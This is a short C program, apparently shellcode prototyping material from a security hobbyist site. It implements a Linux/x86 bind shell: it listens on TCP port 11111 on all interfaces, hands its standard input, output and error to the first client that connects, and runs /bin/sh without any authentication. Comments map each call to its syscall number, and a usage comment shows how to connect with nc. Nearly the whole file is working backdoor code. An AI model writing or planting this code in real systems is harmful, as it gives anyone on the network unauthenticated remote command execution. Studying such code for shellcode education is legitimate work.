/*

 Shell Bind TCP - C Language - Linux/x86
 Copyright (C) 2013 Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

/*

   shell_bind_tcp

   * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)


   # gcc -m32 shell_bind_tcp.c -o shell_bind_tcp
   # ./shell_bind_tcp

   Testing
   # nc 127.0.0.1 11111

*/

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{

	int resultfd, sockfd;
	int port = 11111;
	struct sockaddr_in my_addr;

	// syscall 102
	// int socketcall(int call, unsigned long *args);

	// sycall socketcall (sys_socket 1)
	sockfd = socket(AF_INET, SOCK_STREAM, 0);

	// syscall socketcall (sys_setsockopt 14)
        int one = 1;
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	// set struct values
	my_addr.sin_family = AF_INET; // 2
	my_addr.sin_port = htons(port); // port number
	my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP

	// syscall socketcall (sys_bind 2)
	bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));

	// syscall socketcall (sys_listen 4)
	listen(sockfd, 0);

	// syscall socketcall (sys_accept 5)
	resultfd = accept(sockfd, NULL, NULL);

	// syscall 63
	dup2(resultfd, 2);
	dup2(resultfd, 1);
	dup2(resultfd, 0);

	// syscall 11
	execve("/bin/sh", NULL, NULL);

	return 0;
}
